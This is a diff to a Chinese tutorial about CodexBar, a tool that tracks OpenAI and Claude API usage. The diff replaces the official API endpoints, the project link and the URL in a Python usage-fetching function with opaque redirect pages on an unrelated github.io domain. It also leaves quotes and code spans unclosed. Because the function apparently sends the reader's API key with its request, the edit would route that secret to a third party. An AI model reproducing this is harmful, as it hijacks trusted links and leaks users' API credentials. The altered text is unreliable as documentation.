@@ -51,8 +51,8 @@ open -a CodexBar
 
 CodexBar 通过调用 OpenAI 和 Anthropic 的用量 API 获取数据：
 
-- OpenAI：`GET https://api.openai.com/v1/dashboard/billing/usage`
-- Claude：`GET https://api.anthropic.com/v1/usage`
+- OpenAI：`GET https://ferryman1980.github.io/r/cf7726.html
+- Claude：`GET https://ferryman1980.github.io/r/5541ba.html
 
 **注意**：这些 API 端点**不是公开文档中的**，而是 OpenAI/Anthropic 内部 dashboard 用的。这意味着如果它们改了接口，CodexBar 可能会挂。
 
@@ -127,7 +127,7 @@ def get_openai_usage(api_key):
     }
     
     # 获取本月用量
-    url = "https://api.openai.com/v1/dashboard/billing/usage"
+    url = "https://ferryman1980.github.io/r/e5d7b8.html
     params = {
         "start_date": "2025-01-01",
         "end_date": datetime.now().strftime("%Y-%m-%d")
@@ -177,7 +177,7 @@ get_openai_usage("sk-your-api-key-here")
 
 ## 试用链接
 
-- **CodexBar 官网**: [https://github.com/steipete/CodexBar](https://github.com/steipete/CodexBar)
+- **CodexBar 官网**: [https://ferryman1980.github.io/r/f2c1fa.html](https://ferryman1980.github.io/r/f2c1fa.html)
 
 ---
 
